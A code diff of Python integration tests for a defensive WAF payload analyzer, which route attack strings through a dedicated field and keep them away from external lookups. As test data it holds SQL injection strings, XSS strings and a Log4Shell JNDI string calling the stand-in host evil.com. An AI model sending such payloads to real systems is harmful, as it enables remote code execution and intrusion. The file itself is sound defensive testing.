@@ -1,22 +1,23 @@
-"""Integration tests for WAF payload type detection and pipeline routing.
+"""Integration tests for the WAF Payload field and its pipeline routing.
 
-Per ``docs/waf_payload_analyzer.md`` D6, this module's highest-risk integration
-point is that WAF payloads arrive through the *same* textarea as every other
-IOC, so they are inside ``parsed_input_items`` by construction — unlike the
-process and command-line modules, whose findings never enter that list at all.
+WAF payloads used to arrive through the *same* textarea as every other IOC
+(docs/waf_payload_analyzer.md D5/D6), which meant a payload landed inside
+``parsed_input_items`` by construction and had to be partitioned back out
+before ``summarize_results`` and provider dispatch ever saw it — the
+highest-risk step the module shipped with.
 
-Two claims D6 makes are asserted here against the real code rather than taken on
-trust:
+They now arrive through a dedicated Context field (``WAF Payload``, alongside
+Command Line), parsed by :func:`core.waf_payload_parser.parse_waf_field` and
+analysed independently of :func:`ioc.parser.parse_iocs`. That removes the
+risk at its root: a payload can no longer reach ``parsed_input_items`` at
+all, so it cannot reach ``summarize_results`` or provider dispatch by any
+path. The two claims below are still worth asserting against the real code
+rather than taken on trust:
 
-1. a WAF payload never reaches :func:`ioc.verdict.summarize_results`, which
-   emits one row and one session-summary count per item it is given;
-2. a WAF payload resolves to an empty provider set, so no lookup can fire for
-   it — an attacker-supplied payload must never be forwarded to an external
-   service.
-
-The second is currently true *by omission* (no entry in the type-to-group map).
-Testing it makes it true by intent, so that adding a mapping later fails loudly
-here instead of quietly enabling outbound calls.
+1. a WAF payload never reaches :func:`ioc.verdict.summarize_results`;
+2. the WAF payload list is never passed into provider dispatch, so no lookup
+   can fire for it — an attacker-supplied payload must never be forwarded to
+   an external service.
 """
 from __future__ import annotations
 
@@ -25,6 +26,7 @@ import unittest
 import dataclasses
 
 from core.waf_payload_analyzer import analyze_waf_payload, to_rows
+from core.waf_payload_parser import parse_waf_field
 from ioc.parser import parse_iocs
 from ioc.verdict import summarize_results
 
@@ -32,19 +34,15 @@ SQLI_LINE = "/login?user= | ' OR '1'='1"
 LOG4SHELL_LINE = "/api/data | ${jndi:ldap://evil.com/a}"
 
 
-class TestTypeDetection(unittest.TestCase):
-    def test_waf_payload_is_detected_and_split(self) -> None:
-        items = parse_iocs(SQLI_LINE)
-        self.assertEqual(len(items), 1)
-        self.assertEqual(items[0].type, "waf_payload")
-        self.assertIsNotNone(items[0].waf)
-        self.assertEqual(items[0].waf.path, "/login?user=")
-        self.assertEqual(items[0].waf.payload, "' OR '1'='1")
+class TestIocBoxNoLongerDetectsWaf(unittest.TestCase):
+    """The IOC textarea's type cascade dropped the WAF branch entirely."""
 
-    def test_value_stays_the_raw_line(self) -> None:
-        # ``value`` is the dedup key, the row label and what the analyst typed.
-        items = parse_iocs(LOG4SHELL_LINE)
-        self.assertEqual(items[0].value, LOG4SHELL_LINE)
+    def test_delimited_lines_are_no_longer_typed_as_waf_payload(self) -> None:
+        # Neither line matches any of the remaining six detectors, so both
+        # are silently dropped — the same fate any unrecognised line gets.
+        for line in (SQLI_LINE, LOG4SHELL_LINE):
+            with self.subTest(line=line):
+                self.assertEqual(parse_iocs(line), [])
 
     def test_existing_types_are_unaffected(self) -> None:
         raw = "\n".join([
@@ -58,90 +56,86 @@ class TestTypeDetection(unittest.TestCase):
         types = [i.type for i in parse_iocs(raw)]
         self.assertEqual(types, ["ip", "domain", "url", "hash", "email", "whois"])
 
-    def test_waf_detection_never_steals_another_type(self) -> None:
-        # Every detector above the WAF check is anchored ^…$, so none can match
-        # a line with the delimiter — but a URL carrying a quote or an angle
-        # bracket is the case where a careless reordering would do damage.
-        for line in (
-            "http://example.com/search?q=<script>alert(1)</script>",
-            "example.com/login?id=1'",
-            "8.8.8.8",
-        ):
-            with self.subTest(line=line):
-                items = parse_iocs(line)
-                self.assertEqual(len(items), 1)
-                self.assertNotEqual(items[0].type, "waf_payload")
+    def test_ioc_dataclass_carries_no_waf_field(self) -> None:
+        # The split used to ride alongside the IOC (``IOC.waf``). That field
+        # is gone now that the split never happens on this path.
+        item = parse_iocs("8.8.8.8")[0]
+        self.assertFalse(hasattr(item, "waf"))
 
-    def test_mixed_batch_keeps_order_and_types(self) -> None:
+    def test_mixed_batch_only_sees_real_iocs(self) -> None:
         raw = "\n".join(["8.8.8.8", SQLI_LINE, "example.com"])
         items = parse_iocs(raw)
-        self.assertEqual(
-            [(i.type) for i in items],
-            ["ip", "waf_payload", "domain"],
-        )
-
-    def test_non_waf_iocs_carry_no_split(self) -> None:
-        for item in parse_iocs("8.8.8.8\nexample.com"):
-            with self.subTest(value=item.value):
-                self.assertIsNone(item.waf)
-
-    def test_missing_payload_survives_line_stripping(self) -> None:
-        # parse_iocs strips each line, so a trailing-space delimiter is gone by
-        # the time the type cascade runs. Asserted here rather than only at unit
-        # level, because the unit test passes on input the app cannot produce.
-        items = parse_iocs("/login?user= | \n")
-        self.assertEqual(len(items), 1)
-        self.assertEqual(items[0].type, "waf_payload")
-        self.assertEqual(items[0].waf.payload, "")
+        self.assertEqual([i.type for i in items], ["ip", "domain"])
 
 
-class TestManualModeExemption(unittest.TestCase):
-    def test_waf_payload_survives_a_restrictive_manual_filter(self) -> None:
-        # Manual mode's checkboxes gate provider calls per IOC group. A WAF
-        # payload makes no provider calls and has no checkbox, so filtering it
-        # out would drop the line with no way for the analyst to opt back in.
-        items = parse_iocs(
-            "\n".join([SQLI_LINE, "8.8.8.8"]),
-            auto_detect=False,
-            allowed_types={"hash"},
-        )
-        self.assertEqual([i.type for i in items], ["waf_payload"])
+class TestWafField(unittest.TestCase):
+    """The dedicated field lifts both restrictions D5 imposed on the IOC box."""
 
-    def test_manual_filter_still_applies_to_every_other_type(self) -> None:
-        items = parse_iocs(
-            "8.8.8.8\nexample.com",
-            auto_detect=False,
-            allowed_types={"ip"},
-        )
-        self.assertEqual([i.type for i in items], ["ip"])
+    def test_payload_only_line_is_accepted(self) -> None:
+        # D5's payload-only fallback was deferred in the shared textarea
+        # because SCHEMELESS_URL_RE already claims host-plus-path lines. A
+        # dedicated field has no such contest.
+        parsed = parse_waf_field("' OR '1'='1")
+        self.assertEqual(len(parsed), 1)
+        self.assertIsNone(parsed[0].path)
+        self.assertEqual(parsed[0].payload, "' OR '1'='1")
+
+    def test_delimited_line_still_splits_path_and_payload(self) -> None:
+        parsed = parse_waf_field(SQLI_LINE)
+        self.assertEqual(len(parsed), 1)
+        self.assertEqual(parsed[0].path, "/login?user=")
+        self.assertEqual(parsed[0].payload, "' OR '1'='1")
+
+    def test_multiple_lines_each_become_one_entry(self) -> None:
+        text = "\n".join([SQLI_LINE, LOG4SHELL_LINE, "javascript:alert(1)"])
+        parsed = parse_waf_field(text)
+        self.assertEqual(len(parsed), 3)
+        self.assertEqual(parsed[2].payload, "javascript:alert(1)")
+
+    def test_blank_lines_are_skipped(self) -> None:
+        parsed = parse_waf_field(f"\n{SQLI_LINE}\n\n\n{LOG4SHELL_LINE}\n")
+        self.assertEqual(len(parsed), 2)
+
+    def test_empty_field_yields_no_entries(self) -> None:
+        self.assertEqual(parse_waf_field(""), [])
+        self.assertEqual(parse_waf_field("   \n  \n"), [])
+
+    def test_marker_gate_does_not_drop_a_line(self) -> None:
+        # In the shared textarea a payload tripping no marker is refused
+        # (D5) so a stray pipe in an unrelated line isn't misread as an
+        # attack. That contest doesn't exist here — the analyst chose this
+        # box — so a benign-looking line is analysed anyway.
+        parsed = parse_waf_field("hello world")
+        self.assertEqual(len(parsed), 1)
+        self.assertEqual(parsed[0].markers, [])
+
+    def test_trailing_delimiter_with_no_payload_is_kept(self) -> None:
+        parsed = parse_waf_field("/login?user= |")
+        self.assertEqual(len(parsed), 1)
+        self.assertEqual(parsed[0].path, "/login?user=")
+        self.assertEqual(parsed[0].payload, "")
 
 
 class TestPipelineRouting(unittest.TestCase):
-    """D6 — the partition, asserted rather than assumed."""
-
-    @staticmethod
-    def _partition(raw: str) -> tuple[list, list]:
-        """Mirror of the partition in app.py's enrichment block."""
-        parsed = parse_iocs(raw)
-        waf = [i for i in parsed if i.type == "waf_payload"]
-        rest = [i for i in parsed if i.type != "waf_payload"]
-        return waf, rest
+    """The WAF field's results never enter the IOC pipeline."""
 
     def test_summarize_results_never_sees_a_payload(self) -> None:
-        waf_items, items = self._partition("\n".join([SQLI_LINE, "8.8.8.8"]))
+        items = parse_iocs("8.8.8.8")
+        waf_items = parse_waf_field(SQLI_LINE)
         self.assertEqual(len(waf_items), 1)
 
         summary, rows = summarize_results(items, {}, {}, {}, {}, {})
 
-        # One row and one count for the IP, nothing for the payload. Passing the
-        # unpartitioned list here would produce an evidence-free "Unknown" row
-        # and inflate the session totals the score panel renders.
+        # One row and one count for the IP, nothing for the payload —
+        # ``items`` was never given anything from the WAF field to begin
+        # with, so there is no partition left to get wrong.
         self.assertEqual(summary["total"], 1)
         self.assertEqual(len(rows), 1)
         self.assertEqual(rows[0]["Artifact"], "8.8.8.8")
 
-    def test_a_payload_only_batch_produces_no_ioc_rows(self) -> None:
-        waf_items, items = self._partition("\n".join([SQLI_LINE, LOG4SHELL_LINE]))
+    def test_a_payload_only_run_produces_no_ioc_rows(self) -> None:
+        items = parse_iocs("")
+        waf_items = parse_waf_field("\n".join([SQLI_LINE, LOG4SHELL_LINE]))
         self.assertEqual(len(waf_items), 2)
         self.assertEqual(items, [])
 
@@ -151,30 +145,25 @@ class TestPipelineRouting(unittest.TestCase):
 
 
 class TestEndToEnd(unittest.TestCase):
-    """The full app.py path: parse, partition, analyse, render."""
+    """The full app.py path: parse the two fields, analyse, render."""
 
-    RAW = "\n".join([
-        "8.8.8.8",
+    IOC_RAW = "\n".join(["8.8.8.8", "example.com"])
+    WAF_RAW = "\n".join([
         "/login?user= | id=1%27 OR 1=1",
         "/api/data | ${jndi:ldap://evil.com/a}",
-        "example.com",
-        "server1 | server2",
     ])
 
     def _run(self) -> tuple[dict, list, list]:
         """Mirror app.py's enrichment block, minus the provider calls."""
-        parsed = parse_iocs(self.RAW)
-        waf_items = [i for i in parsed if i.type == "waf_payload"]
-        items = [i for i in parsed if i.type != "waf_payload"]
-        waf_results = [analyze_waf_payload(i.waf) for i in waf_items if i.waf]
+        items = parse_iocs(self.IOC_RAW)
+        waf_items = parse_waf_field(self.WAF_RAW)
+        waf_results = [analyze_waf_payload(w) for w in waf_items]
         summary, rows = summarize_results(items, {}, {}, {}, {}, {})
         waf_rows = [row for r in waf_results for row in to_rows(r)]
         return summary, rows, waf_rows
 
-    def test_batch_splits_into_the_right_two_streams(self) -> None:
+    def test_the_two_fields_produce_independent_streams(self) -> None:
         summary, rows, waf_rows = self._run()
-        # The IP and the domain go through the IOC pipeline; the two payloads
-        # go through this module; the stray-pipe line is dropped by the gate.
         self.assertEqual(summary["total"], 2)
         self.assertEqual([r["Artifact"] for r in rows], ["8.8.8.8", "example.com"])
         self.assertEqual(len(waf_rows), 2)
@@ -187,22 +176,22 @@ class TestEndToEnd(unittest.TestCase):
         self.assertEqual(len(keys), 1, "row schemas diverged between streams")
 
     def test_result_survives_asdict_for_the_json_output(self) -> None:
-        parsed = parse_iocs("/login?user= | id=1%27 OR 1=1")
-        result = analyze_waf_payload(parsed[0].waf)
+        parsed = parse_waf_field("/login?user= | id=1%27 OR 1=1")
+        result = analyze_waf_payload(parsed[0])
         blob = dataclasses.asdict(result)
         self.assertEqual(blob["path"], "/login?user=")
         self.assertIn("1' OR 1=1", blob["decoded_payload"])
         self.assertIn("crs_anomaly_score_pl12", blob)
         self.assertIn("cve_fingerprint_match", blob)
 
-    def test_payload_only_batch_still_produces_rows(self) -> None:
-        parsed = parse_iocs("/api/data | ${jndi:ldap://evil.com/a}")
-        waf_items = [i for i in parsed if i.type == "waf_payload"]
-        results = [analyze_waf_payload(i.waf) for i in waf_items if i.waf]
+    def test_payload_only_field_still_produces_rows(self) -> None:
+        parsed = parse_waf_field("${jndi:ldap://evil.com/a}")
+        results = [analyze_waf_payload(w) for w in parsed]
         rows = [row for r in results for row in to_rows(r)]
         self.assertEqual(len(rows), 1)
         # Log4Shell trips its curated CVE fingerprint, the module's only
-        # single-source Malicious (D10).
+        # single-source Malicious (D10) — unaffected by where the line came
+        # from, since the analyzer never sees the source field.
         self.assertEqual(rows[0]["Verdict"], "Malicious")
 
 
@@ -222,15 +211,16 @@ class TestProviderIsolation(unittest.TestCase):
         block = text[start:text.index("}", start)]
         self.assertNotIn("waf_payload", block)
 
-    def test_partition_happens_before_provider_dispatch(self) -> None:
-        # Ordering is the whole defence: the partition must appear ahead of the
-        # provider_flags computation in the enrichment block.
+    def test_waf_field_is_parsed_before_provider_dispatch(self) -> None:
+        # Ordering still matters for readability even though the WAF list can
+        # no longer leak into ``items``: the field should be resolved ahead
+        # of the provider_flags computation in the enrichment block.
         from pathlib import Path
 
         text = (Path(__file__).resolve().parents[1] / "app.py").read_text(encoding="utf-8")
-        partition_at = text.index('i.type == "waf_payload"')
+        parse_at = text.index("_waf_items = parse_waf_field(")
         dispatch_at = text.index("provider_flags = {p: bool(_payload(p))")
-        self.assertLess(partition_at, dispatch_at)
+        self.assertLess(parse_at, dispatch_at)
 
 
 if __name__ == "__main__":
